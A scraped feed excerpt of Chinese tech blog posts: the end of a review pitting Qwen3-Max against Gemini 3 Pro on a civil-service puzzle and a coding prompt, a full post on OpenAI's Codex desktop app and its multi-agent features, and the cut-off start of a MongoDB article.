<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0c7c044eb5145e38d5c4a7a9880b04f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=c03CqPklIYEgELbmO22BBi6cx9w%3D" alt="图片" loading="lazy"/></p>
<p>到时候看Qwen3预测得准不准，春晚就揭晓！</p>
<h3 data-id="heading-6">7.公务员真题图形推理题</h3>
<p>Qwen思路和答案都完胜，gemini 3 pro居然做错了</p>
<p>纯图形题目对于只有文字输入的大模型来说是无解的</p>
<p>但是这次Qwen 3 max是可以上传视频的，来看看Qwen 3 实力如何。</p>
<p>下面是一道，公务员考试真题：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab699870426444f99ab4bfca18dfca7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=EHx3uJOHW%2FV5lBXWERYw9T921fg%3D" alt="图片" loading="lazy"/></p>
<p>如何判断这是一道好的公务员题目，就在于每个人去看了答案，都会觉得很简单，但是让你自己在考场做，就是做不出来。</p>
<p>这样的题目考验的正是公务员在为人民服务的过程中办理实事、处置突变事项、临场判断的综合素质，而不是悠哉坐在办公室里的马后炮和键盘侠。</p>
<p>正强如Gemini 3 pro也做不出来，我一点不意外。</p>
<p>但是让我很意外的是，Qwen 3 max居然做出来了</p>
<p>以下是Qwen 3 max的解题</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08231c5d629948bfa6d2a9e42a1ae0c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=UmJRNn0YrZpZN3F068LKKryoN2o%3D" alt="图片" loading="lazy"/></p>
<p>让我们点开思维链，看看Qwen 3 max是如何思考的：</p>
<p>可以看见Qwen 3 的结构化思考，完全就是一位真实的公务员考生：</p>
<p>先是分析图形变化规律、然后再尝试推导逻辑关系，然后发现了找不到这个规律，于是又返回上一层重新思考图形规律，最后找到正确思路。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3da55992f6e442fe9855edbe38f1d8f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=f9PHQwemrQIuyQ4Tckpz9c%2FbIZ8%3D" alt="图片" loading="lazy"/></p>
<p>其实最后这一句（注：）实为画龙点睛之笔，让我啧啧称奇。</p>
<p>一年几百万公务员考生不断刷题、报班、看课，就是为了找到题型规律，让自己的脑子在考场上能适应“试题模式”，从而拿高分。</p>
<p>然而，Qwen 3 轻飘飘说出这一句，于无声处听惊雷，意味着已经完全把公务员考试的出题逻辑尽在掌握。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8b8d9ee32541bb91fd48bc766e48b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=vbtcFdzbrCRHKpkdHfoB714md6o%3D" alt="图片" loading="lazy"/></p>
<p>以下是Gemini 3 pro思考了接近4分钟后，不仅被这道题目逼出了母语英文，</p>
<p>还给出了错误答案。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9e15d8d004e474eb5d3a98eddacd948~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=Nw6rcOXtSevEVwHqfY%2B6nx%2B8vRI%3D" alt="图片" loading="lazy"/></p>
<p>特地翻译出来，看看gemini 3到底怎么错的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/653b3b63564240e49320f71748b216f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=0s43AOCpjklwdxP%2BUU7h%2FX%2BHNnY%3D" alt="图片" loading="lazy"/></p>
<p>其实Gemini 3 pro一度接近正确思路，但是不知为何突然开始混乱了，</p>
<p>也许是因为还没有Qwen 3 pro一样，能懂得公务员考试的出题套路。</p>
<h3 data-id="heading-7">代码类：会喷火的旋转六边形小球</h3>
<p>似乎代码能力并没有那么好，试了一下GLM4.7能顺利跑出来的case，Qwen 3还是有瑕疵。</p>
<pre><code class="hljs language-css" lang="css">prompt：用 <span class="hljs-selector-tag">HTML</span>、CSS 和 JavaScript 实现这样一个效果：一个小球被困在一个旋转的六边形内部。小球受到地球重力的作用，并与六边形内壁产生摩擦。小球的弹跳需要看起来逼真自然。
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f37ecf61fb78497c827549d6f0e7fd3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=TOSsYaLMPtIc6aCoY5R7CbFvLWQ%3D" alt="图片" loading="lazy"/></p>
<p>优点是，Qwen 3 自动帮我考虑到了可调节参数，能让我调节旋转速度、重置位置、暂停旋转等，下面还有参数显示。</p>
<p>缺点是，这个明显还有缺陷，小球会喷火。。</p>
<h2 data-id="heading-8">写在最后</h2>
<p>虽然 Qwen3-Max-Thinking 在代码场景下还有瑕疵，但整体表现还是非常不错的。</p>
<p>特别是在逻辑推理、信息检索和中文语境的理解上，它给人的感觉非常扎实。</p>
<p>不知道Qwen在春节还有没有什么压箱底的大招，再放出来，我们可以一起期待一下。毕竟阿里的技术还是非常强劲的~</p>
<p>我是袋鼠帝，一个在这个AI时代，持续分享AI实践干货，陪你一起进化的数字游民。</p>
<p>谢谢你耐心看完我的文章~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码]]></title>    <link>https://juejin.cn/post/7602177588443463699</link>    <guid>https://juejin.cn/post/7602177588443463699</guid>    <pubDate>2026-02-03T05:58:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588443463699" data-draft-id="7602211941513068598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码"/> <meta itemprop="keywords" content="OpenAI,AIGC,AI编程"/> <meta itemprop="datePublished" content="2026-02-03T05:58:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:58:07.000Z" title="Tue Feb 03 2026 05:58:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p><strong>OpenAI 终于把 IDE 扔了。</strong></p>
<p>昨天，OpenAI 发布了 Codex 桌面 App（macOS），不是插件，不是网页，是一个独立的 <strong>AI 编程指挥中心</strong>。你可以同时开 10 个 Agent，分别写前端、跑测试、修 CI、部署上线——然后你去喝杯咖啡，回来 review 代码就行。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a3f52d43f3f4b6cb11ce3e3194d9b41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=UCtjlJhF3aUSO2h%2FSr7RPerJak8%3D" alt="" loading="lazy"/></p>
<p>Sam Altman 自己在发布会上说：<strong>"我做了一个大项目，几天时间，全程没打开过 IDE 。一次都没有。"</strong></p>
<p>我逆向过 Copilot，从 Copilot 到 Cursor 到 Claude Code 到 Codex，AI 编程工具我基本每一代都深度用过。今天聊聊这个 Codex App 到底意味着什么。</p>
<hr/>
<h2 data-id="heading-0">01 不是又一个编辑器插件</h2>
<p>先说清楚 Codex App 是什么、不是什么。</p>
<p><strong>不是</strong>：VS Code 插件、网页版 IDE、又一个聊天窗口</p>
<p><strong>是</strong>：一个管理多个 AI 编程 Agent 的桌面应用，类似"AI 程序员团队的项目管理工具"</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3436925349b04ee1816c7444f769cb85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=lgo7LyV2LyZg7WBtvayQmV4kQHs%3D" alt="" loading="lazy"/></p>
<p>核心变化：</p>
<ul>
<li>
<p><strong>多 Agent 并行</strong>：每个 Agent 跑在独立线程里，按项目分组，互不干扰</p>
</li>
<li>
<p><strong>Worktree 隔离</strong>：每个 Agent 在你代码仓库的独立副本上工作，不会搞乱你的 git 状态</p>
</li>
<li>
<p><strong>长时运行</strong>：Agent 可以跑几十分钟甚至几小时，你不用盯着</p>
</li>
<li>
<p><strong>Skills 系统</strong>：支持扩展技能包——Figma 设计稿转代码、Linear 项目管理、Cloudflare 部署，一键挂载</p>
</li>
<li>
<p><strong>Automations</strong>：定时任务，比如每天自动跑一遍测试、分类 issue、生成发布日报</p>
</li>
</ul>
<p>以前用 Copilot，是你写一行它补一行。用 Cursor，是你写一段它改一段。</p>
<p><strong>现在用 Codex App，是你说一句话，10 个 Agent 同时干 10 件事。</strong></p>
<p>这不是量变，是质变。</p>
<hr/>
<h2 data-id="heading-1">02 我最关注的三个细节</h2>
<h3 data-id="heading-2">细节一：Agent 可以"自己玩自己"</h3>
<p>OpenAI 在官方演示里让 Codex 做了一个赛车游戏——8 张地图、多个角色、道具系统。一个 prompt 发出去，Agent 自己当设计师、当开发者、当 QA 测试员，<strong>消耗了 700 万 tokens</strong>，全程只需要一次人类输入。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26697fd4041b4febbe929fd6c4cf7720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=Iv2v2Pcs2JKAx4Yijmh1Yz0Vwtk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ccb26ac8aa143b1ba833dc58de96fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=%2BryYr%2BDqMnyyaD%2BDSNtsb3imgtU%3D" alt="" loading="lazy"/></p>
<p>以前：写代码 → 手动测 → 发现 bug → 再写 → 再测</p>
<p>现在：写代码 → 自己测 → 自己修 → 交给你 review</p>
<p><strong>AI 编程正在从"结对编程"变成"团队管理"。</strong></p>
<h3 data-id="heading-3">细节二：Skills 生态——这才是护城河</h3>
<p>Codex App 内置了 Skills 系统，和 Claude Code 的 Skills、OpenClaw 的 Skills 本质上是同一个思路：<strong>把重复性工作打包成可复用的技能包</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26cf6f4f5f264408a3eef4d39686b2ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=eaitDlmy5WVTuxG6f2DpGwv%2BDhA%3D" alt="" loading="lazy"/></p>
<p>官方已经开源了一批：</p>
<ul>
<li>
<p><strong>Figma 设计稿实现</strong>：拉取设计上下文，1:1 还原 UI</p>
</li>
<li>
<p><strong>Linear 项目管理</strong>：自动分类 bug、跟踪发布、管理工作量</p>
</li>
<li>
<p><strong>云部署</strong>：一键推到 Cloudflare/Vercel/Netlify</p>
</li>
<li>
<p><strong>图片生成</strong>：用 GPT Image 生成网站素材、游戏资产</p>
</li>
<li>
<p><strong>文档处理</strong>：读写 PDF/Excel/Word</p>
</li>
</ul>
<p>OpenAI 内部已经用了几百个自定义 Skills 来处理日常工作——跑 eval、盯训练、写文档、统计增长数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c32de1e01560457a97f919ea5246b810~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=vutNyyseTJaguKeuOAazMpm93RQ%3D" alt="" loading="lazy"/></p>
<p><strong>谁的 Skills 生态更丰富，谁就赢。</strong> 这和手机应用商店是同一个逻辑。</p>
<h3 data-id="heading-4">细节三：Automations——AI 不下班</h3>
<p>这是我最兴奋的功能。你可以设置 Codex 定时执行任务：</p>
<ul>
<li>
<p>每天早上自动 triage 新 issue</p>
</li>
<li>
<p>每次 CI 失败自动分析原因并生成修复 PR</p>
</li>
<li>
<p>每周自动生成发布日报</p>
</li>
<li>
<p>定时检查代码质量，发现问题主动报警</p>
</li>
</ul>
<p><strong>以前 Agent 是你叫它才动。现在 Agent 是全年无休的员工。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88f2708dc0b44b3794574a7de7e39999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=tZWN6HvsYdDmuj3Y%2B%2BvTdNTQjuM%3D" alt="" loading="lazy"/></p>
<p>如果你用过 OpenClaw 的 cron + heartbeat 机制，会觉得这个思路很熟悉——AI Agent 的终局就是"不需要人触发，自己发现问题、自己解决问题"。</p>
<hr/>
<h2 data-id="heading-5">03 和 Claude Code 比，谁更强？</h2>
<p>说实话，这个问题目前没有标准答案。但我可以从几个维度给你一个参考：</p>













































<table><thead><tr><th>维度</th><th>Codex App</th><th>Claude Code</th></tr></thead><tbody><tr><td>多 Agent 并行</td><td>✅ 核心卖点，原生支持</td><td>⚠️ 通过 sub-agents 支持</td></tr><tr><td>Skills 生态</td><td>✅ 官方开源 + 社区</td><td>✅ 成熟，社区活跃</td></tr><tr><td>定时自动化</td><td>✅ 内置 Automations</td><td>⚠️ 需要 OpenClaw 等工具</td></tr><tr><td>模型能力</td><td>GPT-5.2-Codex( TerminalBench #1)</td><td>Claude Opus/Sonnet（SWE-bench 顶级）</td></tr><tr><td>价格</td><td>$20/月起（Plus），$200/月（Pro）</td><td>API 按量付费</td></tr><tr><td>平台</td><td>macOS（Windows 待发布）</td><td>macOS + Linux</td></tr><tr><td>安全沙箱</td><td>✅ 原生沙箱，权限可配</td><td>✅ 沙箱模式</td></tr></tbody></table>
<p><strong>我的判断：Codex App 在"管理多个 Agent"这件事上目前领先；Claude Code 在单 Agent 深度编程能力上依然最强。</strong></p>
<p>如果你的工作是"一次做很多小任务"——比如同时处理 5 个 bug fix、3 个 feature request——Codex App 更适合。</p>
<p>如果你的工作是"深入一个复杂系统做大重构"——Claude Code 的长上下文理解和代码推理能力目前更胜一筹。</p>
<p><strong>不要选边站。两个都用。</strong></p>
<hr/>
<h2 data-id="heading-6">04 对独立开发者意味着什么</h2>
<p>我现在创业做出海产品，团队精简到不能再精简。Codex App 这种"一个人指挥一个 AI 团队"的模式，对独立开发者来说是降维打击：</p>
<p><strong>以前</strong>：一个独立开发者 = 1 个人 <strong>现在</strong>：一个独立开发者 + Codex App = 1 个人 + 10 个 Agent = 一个小型开发团队</p>
<p>具体来说：</p>
<ol>
<li>
<p><strong>并行 开发</strong>：Agent A 写前端，Agent B 写后端 API，Agent C 写测试，同时进行</p>
</li>
<li>
<p><strong>自动化运维</strong>：CI/CD、issue 分类、代码审查全部交给 Automations</p>
</li>
<li>
<p><strong>跨项目管理</strong>：我有 9 个出海小站，以前切换项目上下文很痛苦，现在每个项目独立开 Agent</p>
</li>
</ol>
<p>Sam Altman 在发布会上说了一句话让我印象很深：<strong>"As fast as I can type in new ideas， that is the limit of what can get built。"</strong></p>
<p>翻译一下：<strong>你能想多快，就能做多快。瓶颈不再是编程能力，而是产品想象力。</strong></p>
<hr/>
<h2 data-id="heading-7">05 免费可试 + 用量翻倍</h2>
<p>最后说一个实际的：</p>
<ul>
<li>
<p><strong>ChatGPT Free 和 Go 用户</strong>：限时免费试用 Codex</p>
</li>
<li>
<p><strong>Plus/Pro/Business/Enterprise/Edu 用户</strong>：限时 rate limit 翻倍</p>
</li>
<li>
<p><strong>翻倍适用范围</strong>：App、CLI、IDE 插件、Cloud，全平台生效</p>
</li>
</ul>
<p>上个月已经有超过 <strong>100 万开发者</strong> 使用 Codex。GPT-5.2-Codex 是 OpenAI 有史以来被采用最快的模型。</p>
<p>如果你还没试过，现在是最好的时机。</p>
<hr/>
<p><strong>AI 编程的竞争已经从"谁的模型更聪明"变成了"谁让开发者更爽"。</strong></p>
<p>Copilot 教会了我们让 AI 补代码。Cursor 教会了我们让 AI 改代码。Claude Code 教会了我们让 AI 写代码。</p>
<p><strong>Codex App 要教会我们的是：让 AI 替你管一个团队。</strong></p>
<p>你准备好当 CTO 了吗？</p>
<hr/>
<p>如果这篇对你有帮助，欢迎点赞、收藏、关注，你的支持是我持续输出的动力 ✨</p>
<hr/>
<p>我的其他平台账号和开源项目在个人主页中，欢迎交流 🤝</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？]]></title>    <link>https://juejin.cn/post/7602243150158020635</link>    <guid>https://juejin.cn/post/7602243150158020635</guid>    <pubDate>2026-02-03T06:02:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150158020635" data-draft-id="7602206323460718643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T06:02:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:02:02.000Z" title="Tue Feb 03 2026 06:02:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 